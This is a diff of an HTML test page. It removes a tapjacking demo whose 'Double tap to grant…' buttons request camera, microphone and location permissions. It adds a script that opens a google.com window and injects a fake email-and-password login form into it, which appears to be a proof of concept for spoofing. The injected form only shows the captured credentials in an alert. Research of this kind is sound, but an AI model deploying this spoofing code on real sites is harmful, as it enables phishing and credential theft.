@@ -1,77 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iOS Tapjack - Permissions</title>
-    <style>
-        .red-button {
-            position: relative;
-            top: 45vh;
-            left: 45vw;
-            background-color: rgb(79, 235, 89);
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-            display: inline-block;
-            margin: 10px;
-        }
-        .button-container {
-            text-align: center;
-            margin-top: 20vh;
-        }
-    </style>
-    <script>
-        function requestCamera() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then((stream) => {
-                        alert('Camera access granted');
-                        // You can now use the stream for video capture
-                    })
-                    .catch((error) => {
-                        alert('Error accessing camera: ' + error.message);
-                    });
-            } else {
-                alert('Camera access is not supported by this browser.');
-            }
-        }
-
-        function requestMicrophone() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ audio: true })
-                    .then((stream) => {
-                        alert('Microphone access granted');
-                        // You can now use the stream for audio capture
-                    })
-                    .catch((error) => {
-                        alert('Error accessing microphone: ' + error.message);
-                    });
-            } else {
-                alert('Microphone access is not supported by this browser.');
-            }
-        }
-
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition((position) => {
-                    alert('Location access granted: ' + position.coords.latitude + ', ' + position.coords.longitude);
-                }, (error) => {
-                    alert('Error accessing location: ' + error.message);
-                });
-            } else {
-                alert('Geolocation is not supported by this browser.');
-            }
-        }
-    </script>
-</head>
-<body>
-    <div class="button-container">
-        <button class="red-button" onclick="requestCamera()">Double tap to grant camera access</button>
-        <button class="red-button" onclick="requestMicrophone()">Double tap to grant microphone access</button>
-        <button class="red-button" onclick="requestLocation()">Double tap to grant location access</button>
-    </div>
-</body>
-</html>
+<script>
+function go(){
+    var x = window.open('https://www.google.com/csi');
+    setTimeout(function(){
+        x.document.body.innerHTML = '<img src="https://via.placeholder.com/150" alt="Placeholder Image"><h1>Please login</h1>Email:<input id="email"><br>Pass:<input id="pass" type="password"><br><button onclick="alert(\'Email: \'+document.getElementById(\'email\').value+\'\\nPass:\'+document.getElementById(\'pass\').value)">Login</button>';
+    }, 3000);
+}
+</script>
+<button onclick="go()">go</button>
